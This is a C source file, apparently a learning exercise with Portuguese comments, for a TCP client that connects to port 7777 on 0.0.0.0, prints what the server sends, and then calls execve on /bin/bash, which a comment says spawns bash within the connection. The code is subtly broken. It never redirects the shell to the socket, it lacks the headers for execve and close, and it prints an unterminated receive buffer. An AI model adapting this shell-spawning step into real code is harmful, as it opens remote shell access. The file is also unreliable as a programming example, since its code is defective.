#include <stdio.h>
#include <stdlib.h>

#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>

int main(){
  // Workflow do socket 'Client'
  // socket -> connect -> recv

  // Criando um socket
  int network_socket;

  // AF_INET:
  // Address Family, é usado pra designar
  // o tipo de endereço que seu socket pode comunicar,
  // nesse caso, vai ser o Internet Protocol(IP) v4 (IPv4)
  // SOCK_STREAM:
  // Conexão orientada ao protocolo TCP
  // 0:
  // Protocolo padrão (TCP)
  network_socket = socket(AF_INET, SOCK_STREAM, 0);

  // Especificando um endereço para o socket
  struct sockaddr_in server_address;
  // SIN_family:
  // Abreviação de sockaddr_in, para
  // que ele saiba que tipo de endereço
  // estamos utilizando no programa
  // server_address é uma estrutura
  // que guarda alguma informação sobre o
  // endereço após o .
  server_address.sin_family = AF_INET;
  // Especificando a porta
  // htons:
  // (A short integer from network
  // byte oderder to host byte order)
  // Função que transforma a porta
  // no data format apropriado
  server_address.sin_port = htons(7777);
  // Especificando o IP
  // sin_addr é uma estrutura em sí que
  // contém um campo que guarda o endereço em si,
  // os dados do endereço que estamos nos conectando
  // s_addr:
  // server address
  // INADDR_ANY é o mesmo que 0.0.0.0
  server_address.sin_addr.s_addr = INADDR_ANY;
  
  // Chamando a função connect
  // Primeiro parâmetro é o nosso socket, segundo
  // é a base de um conjunto de estruturas de endereço
  // que agem como uma união discriminada(discriminated
  // union), e passando um ponteiro para a função de conexão
  // e o último parâmetro pra conectar é o tamanho
  // do endereço, usando a função sizeof com o terceiro
  // parâmetro. Adressando isso a uma função inteira,
  // que vai nos dizer o exit status do programa
  int connection_status = connect(network_socket, (struct sockaddr *) &server_address, sizeof(server_address));

  // Checando se a conexão teve erro
  if (connection_status == -1){
    printf("Ocorreu um erro fazendo a conexão com o socket remoto\n");
  }
  
  // String com nada dentro (dados do servidor
  // vão parar nessa string)
  char server_response[256];
  // Chamando a função recv
  // Recebendo dados do servidor, mais
  // a string do server_response, e o 
  // tamanho (sizeof) do buffer do response.
  // Parâmetro opcional adicional que vai ser 0
  recv(network_socket, &server_response, sizeof(server_response), 0);

  // Printando os dados que recebemos do servidor
  printf("O servidor respondeu: %s\n", server_response);
  
  // Spawnando o bash dentro da conexão efetuada
  execve("/bin/bash", NULL, NULL);

  // Fechando o socket
  close(network_socket);

  // Conclusão: Cliente TCP que vai
  // printar qualquer dado que pegamos
  // de uma conexão remota
  return 0;
}
